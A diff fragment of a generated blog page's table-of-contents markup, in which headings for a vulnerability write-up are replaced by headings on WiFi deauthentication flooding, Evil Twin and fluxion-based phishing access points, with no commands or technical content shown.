                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="nav-text">漏洞信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F"><span class="nav-text">环境模拟</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%8B%9F%E6%94%BB%E5%87%BB"><span class="nav-text">模拟攻击</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#WiFi-%E8%AE%A4%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB"><span class="nav-text">WiFi 认证洪水攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wifi%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB"><span class="nav-text">wifi钓鱼攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Evil-Twin"><span class="nav-text">Evil Twin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fluxion%E6%90%AD%E5%BB%BA%E9%92%93%E9%B1%BCwifi"><span class="nav-text">fluxion搭建钓鱼wifi</span></a></li></ol></li></ol>
     </div>
 </div>
 
@@ -913,7 +865,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="nav-text">漏洞信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F"><span class="nav-text">环境模拟</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%8B%9F%E6%94%BB%E5%87%BB"><span class="nav-text">模拟攻击</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#WiFi-%E8%AE%A4%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB"><span class="nav-text">WiFi 认证洪水攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wifi%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB"><span class="nav-text">wifi钓鱼攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Evil-Twin"><span class="nav-text">Evil Twin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fluxion%E6%90%AD%E5%BB%BA%E9%92%93%E9%B1%BCwifi"><span class="nav-text">fluxion搭建钓鱼wifi</span></a></li></ol></li></ol>
     </div>
 </div>
 
